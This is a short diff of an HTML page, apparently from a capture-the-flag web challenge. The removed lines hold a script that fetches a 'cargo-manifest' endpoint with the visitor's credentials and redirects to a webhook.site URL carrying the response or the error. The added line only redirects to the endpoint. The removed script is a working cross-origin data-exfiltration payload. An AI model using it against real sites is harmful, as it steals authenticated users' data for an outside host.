@@ -6,17 +6,7 @@
 </head>
 <body>
 <script>
-    fetch("https://digitaltrustctf2026-ep21-trusted-origin.chals.io/api/episode21/cargo-manifest", {
-      method: "GET",
-      credentials: "include"
-    })
-    .then(r => r.text())
-    .then(data => {
-      window.location.href = "https://webhook.site/2633784c-c9d9-4e38-855d-ca6b4a7027ec?data=" + encodeURIComponent(data);
-    })
-    .catch(e => {
-      window.location.href = "https://webhook.site/2633784c-c9d9-4e38-855d-ca6b4a7027ec?err=" + encodeURIComponent(String(e));
-    });
+    window.location.href = "https://digitaltrustctf2026-ep21-trusted-origin.chals.io/api/episode21/cargo-manifest";
 </script>
 </body>
 </html>
